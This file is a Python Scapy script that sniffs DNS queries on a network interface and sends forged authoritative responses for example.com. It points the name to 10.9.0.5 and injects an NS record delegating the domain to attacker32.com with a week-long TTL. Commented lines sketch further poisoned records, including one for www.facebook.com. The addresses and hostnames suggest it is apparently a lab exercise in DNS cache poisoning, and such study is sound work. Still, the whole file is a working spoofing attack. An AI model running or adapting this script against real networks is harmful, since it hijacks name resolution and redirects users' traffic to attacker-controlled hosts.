#!/usr/bin/env python3

from scapy.all import *
import sys

NS_NAME = "example.com"
TTL = 604800        # 604800 = 7 days

def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        
        # Create IP packet...
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        
        # ...and UDP packet
        udp = UDP(sport = 53, dport = pkt[UDP].sport)
        
        # Create the spoofed DNS answer section
        Anssec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A', ttl = TTL, rdata = "10.9.0.5")

        # Create the spoofed DNS authority section
        NSsec = DNSRR(rrname = NS_NAME, type = "NS", ttl = TTL, rdata = "attacker32.com")
        
        # Create the spoofed DNS packet
        dns = DNS(id = pkt[DNS].id, qr = 1, aa = 1, rd = 0, qd = pkt[DNS].qd, ancount = 1, an = Anssec, nscount = 1, ns = NSsec)
        
        # Combine the packets ('/' is used as concatenation operator)
        spoofpkt = ip/udp/dns
        send(spoofpkt)


if __name__ == "__main__":
    myFilter = "udp port 53"    # Set the filter for the sniff function so it filters udp packets on port 53
    pkt = sniff(iface = "br-d1c8ae92feb7", filter = myFilter, prn = spoof_dns)


# The Authority Section
# NSsec = DNSRR(rrname = NS_NAME, type = "NS", ttl = TTL, rdata = "ns.example.net")

# The Additional Section
# Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
# Addsec2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='5.6.7.8')
# Addsec3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')
